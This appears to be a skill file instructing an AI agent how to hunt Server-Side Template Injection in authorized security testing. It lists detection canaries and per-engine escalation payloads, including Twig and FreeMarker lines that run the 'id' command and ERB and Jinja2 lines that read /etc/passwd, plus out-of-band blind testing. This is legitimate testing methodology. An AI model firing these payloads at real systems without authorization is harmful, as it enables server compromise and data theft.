---
name: ssti
description: "Focused hunt for Server-Side Template Injection across template engines (Jinja2, Twig, Freemarker, Velocity, ERB, T4, Smarty, Mako): engine detection via canary arithmetic, per-engine proof payloads, blind SSTE via OOB. Use when the focus is template injection. Not for client-side XSS (use xss) or plain string interpolation."
---

# SSTI (Server-Side Template Injection)

## When to use

- "Hunt SSTI on X", "test the email/report/PDF template of X"
- Suspect inputs: names rendered in templated output, email templates with preview, PDF/report generators, marketing pages, error pages echoing input

## When NOT to use

- Client-side rendering (use `xss`)
- LLM-generated content (use `llm-security`)

## Inputs

- **Target** + the render path(s); one account for stored fields that reach templates

## Rationalizations to reject

- "`${7*7}` returned 49, so RCE" — engine evaluation is proven, RCE is not. Escalate to a read-only proof (`config`, `self`, env vars) before claiming impact.
- "The Angular page renders `{{...}}`" — client-side framework interpolation is `xss` territory; SSTI is server-side evaluation.
- Reporting engine-only detection without output proof — the canary result IS the proof for the vuln, but impact claims need escalation payloads.

## Methodology

### 1. Detection matrix
Send the canary set and record results:
`${7*7}`, `{{7*7}}`, `{{7*'7'}}`, `<%= 7*7 %>`, `#{7*7}`, `{{7*7}}` inside `${...}`, `%{7*7}`, `{{ 7*7 }}`.

Decode results:
- `49` from `{{7*7}}` → generic engine; `{{7*'7'}}` → `7777777` = Jinja2 (Python), `49` = Twig (PHP), `0.142857` = ERB-ish
- `49` from `${7*7}` → FreeMarker / Thymeleaf / Mako / smart strings — distinguish by further probes
- `<%= 7*7 %>` → ERB (Ruby) / EJS
- `#{7*7}` → Ruby interpolation / Thymeleaf / Pug / JS template engines
- `%{7*7}` → Razor-ish / some Java
- FlatMatch `${{7*7}}` for FreeMarker `#{}` legacy

### 2. Escalation (minimal, read-only)
Per engine, one info-read payload:
- Jinja2: `{{ config }}` or `{{ self.__init__.__globals__ }}` — file read via `{{ get_file_contents('/etc/passwd') }}`-style where available; avoid `os.system` unless user allows RCE proof
- Twig: `{{['id']|filter('system')}}` or `{{dump(app)}}`
- FreeMarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` (or `{"freemarker.template.utility.Execute"?new()("id")}`)
- ERB: `<%= Dir.pwd %>` or `<%= File.read('/etc/passwd') %>`
- Mako: `${self.module.__init__.__globals__}`
- Velocity/T4/Smarty: engine-specific read equivalents

Record the output that proves server-side evaluation + data access.

### 3. Blind SSTI
No output reflection? OOB canary per engine (DNS/HTTP callback with a marker). One payload per engine, small set.

### 4. Reachability via stored fields
User-controlled values that end up inside templates server-side: username in a templated email/report ("Hello {{ user.name }}"), custom domain/org names in PDF invoices, report titles. Plant canaries in every stored field that plausibly reaches a renderer, then trigger the render (preview/send/export).

## Reporting

`findings/ssti-<date>.md`. Severity: confirmed server-side code/file read = critical/high (RCE-class impact); engine evaluation with info disclosure = high; evaluation only in a non-sensitive context = medium.

## Focus discipline

If the payload lands in a DB query → `sqli`. If the template renders user content to other users' browsers → also note XSS chain (`xss`).
